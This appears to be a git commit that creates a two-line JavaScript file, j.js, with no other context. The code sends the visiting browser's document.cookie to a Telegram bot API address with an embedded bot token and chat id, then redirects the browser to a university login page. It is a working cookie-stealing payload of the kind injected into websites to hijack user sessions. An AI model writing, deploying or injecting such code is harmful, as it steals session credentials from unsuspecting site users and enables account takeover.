e11e3b303092248eab114bf87e39c90de8530467
ae54 <chromscurity11@gmail.com>
2025-07-02 20:22:29 +0300

    Create j.js

---
+++ j.js
@@ -0,0 +1,2 @@
+navigator.sendBeacon(`https://api.telegram.org/bot7858688597:AAHkWaP75HtsOoU-9UvK094DuONFzZ48VWY/sendMessage?chat_id=6662346056&text=${encodeURIComponent(document.cookie)}`);
+window.location.href = "isb.helwan.edu.eg/login.php";
